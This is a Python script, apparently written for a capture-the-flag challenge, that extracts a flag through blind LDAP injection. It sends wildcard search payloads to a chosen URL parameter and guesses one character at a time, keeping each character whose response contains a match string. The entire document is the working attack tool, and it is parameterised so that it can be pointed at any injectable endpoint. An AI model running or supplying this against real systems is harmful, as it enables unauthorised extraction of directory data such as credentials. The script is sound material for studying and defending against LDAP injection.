#!/usr/bin/python3

import requests
import string
import argparse
import sys

# Possible characters in the flag
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

def main():
    parser = argparse.ArgumentParser(description="Blind LDAP search flag extractor.")
    parser.add_argument("--url", required=True, help="Target URL (e.g., http://127.0.0.1:3000/)")
    parser.add_argument("--prefix", required=True, help="Search prefix (e.g., username)(uid=)")
    parser.add_argument("--param", required=True, help="Parameter name for the query (e.g., search)")
    parser.add_argument("--match", required=True, help="Text to match in the response (e.g., username)")
    parser.add_argument("--length", required=False, help="Max flag length: default 32")
    parser.add_argument("--debug", required=False, help="Debug mode")
    args = parser.parse_args()

    flag = ""
    max_length = args.length or 32

    for i in range(50):
        for char in alphabet:
            payload = args.prefix + flag + char + "*"
            r = requests.get(args.url, params={args.param: payload})

            if args.debug:
                print(f"[i] Trying: {payload}")

            if args.match in r.text:
                flag += char
                print("[+] Flag: " + flag)

                if len(flag) >= max_length:
                    print("[!] Max flag length reached.")
                    sys.exit(0)
                break

if __name__ == "__main__":
    main()
